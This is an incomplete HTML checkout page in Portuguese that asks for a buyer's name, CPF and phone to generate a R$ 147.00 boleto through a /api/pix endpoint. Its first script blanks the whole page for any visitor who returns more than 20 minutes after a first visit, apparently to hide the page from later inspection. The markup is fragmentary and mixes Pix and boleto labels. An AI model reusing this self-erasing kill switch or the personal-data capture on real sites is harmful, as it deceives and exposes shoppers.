<!DOCTYPE html>

    <script>
(function() {
    // Configuração: 20 minutos em milissegundos
    const VINTE_MINUTOS = 20 * 60 * 1000; 
    const agora = new Date().getTime();
    
    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');

    if (!primeiroAcesso) {
        localStorage.setItem('site_primeiro_acesso', agora);
    } else {
        const tempoDecorrido = agora - parseInt(primeiroAcesso);

        if (tempoDecorrido > VINTE_MINUTOS) {
            // Remove todo o conteúdo do HTML e deixa a tela branca
            document.documentElement.innerHTML = "";
            
            // Força o fundo a ficar branco (caso o CSS do site tenha cores)
            document.documentElement.style.backgroundColor = "#ffffff";
            
            // Interrompe qualquer outro carregamento
            window.stop(); 
        }
    }
})();
</script>

    <!-- Modal de Boleto Gerado -->
    <div id="pixCopiedModal" class="pix-modal-overlay">
        <div class="pix-modal-content">
            <button class="pix-modal-external-close" onclick="fecharPixModalDireto()">
                <i class="fas fa-times"></i>
            </button>
            <div class="pix-modal-header">
                <i class="fas fa-check-circle"></i>
                <h2>Boleto Gerado com Sucesso!</h2>
            </div>
            <div class="pix-instructions-list">
                <ul>
                    <li><i class="fas fa-barcode"></i> Copie a linha digitável abaixo</li>
                    <li><i class="fas fa-mobile-alt"></i> Pague no app do seu banco</li>
                    <li><i class="fas fa-file-pdf"></i> Ou baixe o PDF para imprimir</li>
                </ul>
            </div>
            <div class="pix-code-container-compact">
                <input type="text" id="pixCodeCopied" class="pix-code-input-compact" readonly>
                <button class="pix-copy-btn-compact" onclick="copyAgain()">Copiar</button>

    <script>
        let subtotalValue = 147.00;
        let selectedPaymentType = 'pix';
        let timerInterval;
        let lastBoletoUrl = '';

        function setupCPFInput(input) {
            input.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 11) value = value.slice(0, 11);
                if (value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
                else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d{3})/, "$1.$2.$3");
                else if (value.length > 3) value = value.replace(/(\d{3})(\d{3})/, "$1.$2");
                e.target.value = value;
            });
        }

        function setupPhoneInput(input) {
            input.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 11) value = value.slice(0, 11);
                if (value.length > 10) value = value.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
                else if (value.length > 6) value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
                else if (value.length > 2) value = value.replace(/(\d{2})(\d{0,5})/, "($1) $2");
                e.target.value = value;
            });
        }

        function setupNameInput(input) {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[0-9]/g, '');
            });
        }

        function renderOrderSummary() {
            const wrapper = document.getElementById('order-summary-wrapper');
            wrapper.innerHTML = `
                <div class="review-block">
                    <div class="review-header-bar">
                        <div class="review-header-title"><i class="fas fa-shopping-bag"></i> Resumo do Pedido</div>
                    </div>
                    <div style="margin-top: 15px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                            <span>Subtotal</span>
                            <span>R$ ${subtotalValue.toFixed(2).replace('.', ',')}</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; font-weight: 800; font-size: 1.1rem; color: var(--primary);">
                            <span>Total</span>
                            <span>R$ ${subtotalValue.toFixed(2).replace('.', ',')}</span>
                        </div>
                    </div>
                </div>
            `;
        }

        function renderPaymentOptions() {
            const baseTotal = subtotalValue;
            const deliveryTotal = baseTotal * 1.46;
            
            const paymentHTML = `
                <div class="review-block" style="border-bottom: none;">
                    <div class="review-header-title" style="margin-bottom: 20px;"><i class="fas fa-credit-card"></i> Método de Pagamento</div>
                    <div class="payment-options-container">
                        <div class="payment-option-card selected" id="pay-now-pix">
                            <div class="payment-option-icon"><i class="fas fa-barcode"></i></div>
                            <div class="payment-option-title">Boleto Bancário</div>
                            <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                            <div class="payment-option-desc">Pague em qualquer banco ou lotérica. Compensação em até 1 dia útil.</div>
                            <div class="pix-form-container" id="pix-form" style="display: flex;">
                                <div class="pix-input-group">
                                    <label for="pix-name">Nome Completo</label>
                                    <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
                                </div>
                                <div class="pix-input-group">
                                    <label for="pix-cpf">CPF</label>
                                    <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                </div>
                                <div class="pix-input-group">
                                    <label for="pix-phone">Telefone</label>
                                    <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
                                </div>
                                <div id="pix-error-msg" style="display:none; color: var(--danger); font-size: 0.8rem;">
                                    <i class="fas fa-exclamation-circle"></i> <span id="pix-error-text">Erro ao gerar boleto.</span>
                                </div>
                                <button class="payment-action-btn" id="btn-generate-pix" onclick="generateBoleto()">
                                    <span class="btn-text">Gerar Boleto R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
                                </button>
                            </div>
                            <div id="pix-copy-content" class="pix-copy-section">
                                <div class="pix-header-status">
                                    <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Boleto Gerado</div>
                                </div>
                                <div class="pix-code-display-wrapper">
                                    <div class="pix-code-header">
                                        <label class="pix-code-label">Linha Digitável</label>
                                    </div>
                                    <div class="pix-code-input-container">
                                        <span class="pix-code-display-text" id="pix-code-text">Aguardando...</span>
                                        <button class="pix-copy-icon-btn" onclick="copyPixCode()"><i class="fas fa-copy"></i></button>
                                    </div>
                                </div>
                                <button class="btn-copy-pix" onclick="copyPixCode()">Copiar Linha Digitável</button>
                                <button class="btn-copy-pix" style="margin-top: 10px; background: #28a745;" onclick="window.open(lastBoletoUrl, '_blank')">Visualizar Boleto (PDF)</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
            setupNameInput(document.getElementById('pix-name'));
            setupCPFInput(document.getElementById('pix-cpf'));
            setupPhoneInput(document.getElementById('pix-phone'));
        }

        async function generateBoleto() {
            const name = document.getElementById('pix-name').value.trim();
            const cpf = document.getElementById('pix-cpf').value.replace(/\D/g, '');
            const phone = document.getElementById('pix-phone').value.trim();
            const btn = document.getElementById('btn-generate-pix');
            const errorEl = document.getElementById('pix-error-msg');

            if (name.length < 3 || cpf.length !== 11) {
                errorEl.style.display = 'block';
                return;
            }

            btn.innerHTML = '<div class="spinner"></div>';
            btn.disabled = true;

            try {
                const response = await fetch('/api/pix', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ payer_name: name, amount: subtotalValue, payer_phone: phone })
                });
                const data = await response.json();
                if (data.success) {
                    lastBoletoUrl = data.qrCodeUrl;
                    document.getElementById('pix-form').style.display = 'none';
                    document.getElementById('pix-copy-content').style.display = 'flex';
                    document.getElementById('pix-code-text').innerText = data.pixCode;
                    document.getElementById('pixCodeCopied').value = data.pixCode;
                    document.getElementById('pixCopiedModal').classList.add('active');
                } else {
                    alert(data.error || 'Erro ao gerar boleto');
                }
            } catch (err) {
                console.error(err);
                alert('Erro de conexão');
            } finally {
                btn.innerHTML = `Gerar Boleto R$ ${subtotalValue.toFixed(2).replace('.', ',')}`;
                btn.disabled = false;
            }
        }

        function copyPixCode() {
            const code = document.getElementById('pix-code-text').innerText;
            navigator.clipboard.writeText(code).then(() => {
                alert('Linha digitável copiada!');
            });
        }

        function copyAgain() {
            const code = document.getElementById('pixCodeCopied').value;
            navigator.clipboard.writeText(code).then(() => {
                alert('Copiado!');
            });
        }

        function fecharPixModalDireto() {
            document.getElementById('pixCopiedModal').classList.remove('active');
        }

        window.onload = () => {
            renderOrderSummary();
            renderPaymentOptions();
        };
    </script>
</body>
</html>
